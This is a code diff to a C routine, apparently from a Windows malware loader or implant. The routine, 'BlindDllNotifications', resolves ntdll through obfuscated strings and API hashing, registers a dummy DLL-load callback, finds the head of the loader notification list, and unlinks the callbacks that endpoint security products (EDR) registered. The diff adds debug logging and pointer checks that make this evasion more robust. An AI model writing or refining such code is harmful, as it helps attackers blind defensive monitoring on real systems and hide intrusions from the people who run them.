@@ -356,18 +356,23 @@ BOOL InstallExitHookPatchless(IN PVOID pNtdll) {
 // -----------------------------------------------
 BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {
 
+    LOG("[*] BlindDll: entry");
+
     // --- Resolve ntdll ---
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
     DEOBF(xNtdll);
     HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
-    if (!hNtdll)
-        return FALSE;
+    if (!hNtdll) { LOG("[!] BlindDll: ntdll not found"); return FALSE; }
+
+    LOG("[*] BlindDll: ntdll found, validating PE");
 
     // --- Get ntdll image size for address range check ---
     PIMAGE_NT_HEADERS pNt = NULL;
-    if (!ValidatePeHeaders((PVOID)hNtdll, &pNt)) return FALSE;
+    if (!ValidatePeHeaders((PVOID)hNtdll, &pNt)) { LOG("[!] BlindDll: PE invalid"); return FALSE; }
     ULONG_PTR uNtdllStart = (ULONG_PTR)hNtdll;
     ULONG_PTR uNtdllEnd   = uNtdllStart + pNt->OptionalHeader.SizeOfImage;
+
+    LOG("[*] BlindDll: resolving LdrRegister/Unregister");
 
     // --- Resolve LdrRegisterDllNotification ---
     BYTE xReg[] = XSTR_LDR_REG_DLL_NOTIF;
@@ -381,14 +386,16 @@ BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {
     fnLdrUnregDllNotif pLdrUnregister =
         (fnLdrUnregDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xUnreg);
 
-    if (!pLdrRegister || !pLdrUnregister)
-        return FALSE;
+    if (!pLdrRegister || !pLdrUnregister) { LOG("[!] BlindDll: Ldr funcs not found"); return FALSE; }
+
+    LOG("[*] BlindDll: calling LdrRegisterDllNotification");
 
     // --- Register dummy callback to obtain a list entry ---
     PVOID pCookie = NULL;
     NTSTATUS status = pLdrRegister(0, (PVOID)DummyDllNotifCallback, NULL, &pCookie);
-    if (!NT_SUCCESS(status) || !pCookie)
-        return FALSE;
+    if (!NT_SUCCESS(status) || !pCookie) { LOG("[!] BlindDll: LdrRegister failed"); return FALSE; }
+
+    LOG("[*] BlindDll: cookie obtained, walking list");
 
     // Cookie = our LDR_DLL_NOTIF_ENTRY in the notification list
     PLDR_DLL_NOTIF_ENTRY pOurEntry = (PLDR_DLL_NOTIF_ENTRY)pCookie;
@@ -398,23 +405,41 @@ BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {
     // in ntdll's .data section. All callback entries are heap-allocated
     // (outside ntdll's address range). We identify the head by checking
     // if the LIST_ENTRY address falls within ntdll's image.
+    // Safety: cap at 256 iterations and validate each pointer is aligned
+    // and within user-mode range before dereferencing it.
+#define UMODE_PTR_OK(p) ((ULONG_PTR)(p) > 0x10000ULL && \
+                         (ULONG_PTR)(p) < 0x7FFFFFFFFFFF0000ULL && \
+                         (((ULONG_PTR)(p)) & 7) == 0)
 
     PLIST_ENTRY pListHead = NULL;
     PLIST_ENTRY pWalk = pOurEntry->List.Flink;
 
-    while (pWalk != &pOurEntry->List) {
+    for (int iWalk = 0; iWalk < 256 && pWalk != &pOurEntry->List; iWalk++) {
+        if (!UMODE_PTR_OK(pWalk)) {
+            LOG("[!] BlindDll: bad pointer in walk, bailing");
+            pLdrUnregister(pCookie);
+            return FALSE;
+        }
         if ((ULONG_PTR)pWalk >= uNtdllStart && (ULONG_PTR)pWalk < uNtdllEnd) {
             pListHead = pWalk;
             break;
+        }
+        if (!UMODE_PTR_OK(pWalk->Flink)) {
+            LOG("[!] BlindDll: bad Flink in walk, bailing");
+            pLdrUnregister(pCookie);
+            return FALSE;
         }
         pWalk = pWalk->Flink;
     }
 
     if (!pListHead) {
+        LOG("[!] BlindDll: list head not found");
         // Couldn't find list head — unregister our callback and bail
         pLdrUnregister(pCookie);
         return FALSE;
     }
+
+    LOG("[*] BlindDll: list head found, unlinking EDR entries");
 
     // --- Unlink all entries except list head and ours ---
     // After this, only our dummy callback remains in the list.
